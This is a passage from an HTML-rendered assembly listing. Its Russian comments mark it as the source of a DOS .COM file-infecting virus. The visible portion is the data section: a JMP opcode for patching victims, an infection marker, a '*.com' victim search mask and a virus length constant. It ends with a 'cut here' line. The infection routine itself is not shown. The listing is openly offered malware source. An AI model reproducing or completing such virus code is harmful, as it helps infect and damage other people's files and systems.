</span><span class="sc5">jump</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">; JMP в машинном коде</span><span class="sc0">
</span><span class="sc5">jmpadr</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">; сюда заносится на сколько байтов делать JMP</span><span class="sc0">
</span><span class="sc5">q</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Q'</span><span class="sc0">        </span><span class="sc1">; для сравнения на зараженность</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f000h</span><span class="sc0">      </span><span class="sc1">; адрес буфера для сохранения DTA</span><span class="sc0">
</span><span class="sc5">flen</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; сюда заносится длинна жертвы</span><span class="sc0">
</span><span class="sc5">dvc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DVC'</span><span class="sc0">        </span><span class="sc1">; для проверки на чистый вирь</span><span class="sc0">
</span><span class="sc5">fname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; маска по которой ищем жертву</span><span class="sc0">
</span><span class="sc5">virlen</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">  </span><span class="sc1">; длинна виря </span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc1">; ----------------------- резать тут -------------------------------------------</span><span class="sc0">
</span></div></body>
</html>
